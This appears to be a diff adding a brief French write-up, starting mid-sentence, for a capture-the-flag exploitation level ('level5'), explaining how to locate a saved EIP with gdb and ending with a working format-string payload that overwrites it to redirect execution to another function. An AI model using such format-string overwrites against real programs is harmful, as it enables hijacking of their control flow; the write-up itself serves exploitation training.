@@ -1,0 +1,16 @@
+it dans la fonction n bloque le fait quon puisse exploit l'eip
+sauvegarder dans la fonction n donc le but est de faire pointer le
+save eip de printf sur la fonction o.
+Pour ce faire on doit detecter ou se trouve le save eip grace a gdb:
+
+break printf
+run
+i f
+-> recuperer l'adresse de sauvegarde de l'eip
+
+On a maintenant l'adresse que l'on cherchait, il ne reste plus qu'a
+construire notre payload a l'adresse en question pour ecrire a cette
+adresse de la meme maniere que le challenge precedent
+
+
+(python -c 'print "\xfe\xf4\xff\xbf\xfc\xf4\xff\xbf" + "%2044x%4$hn%31904x%5$hn"' ; cat) | ./level5
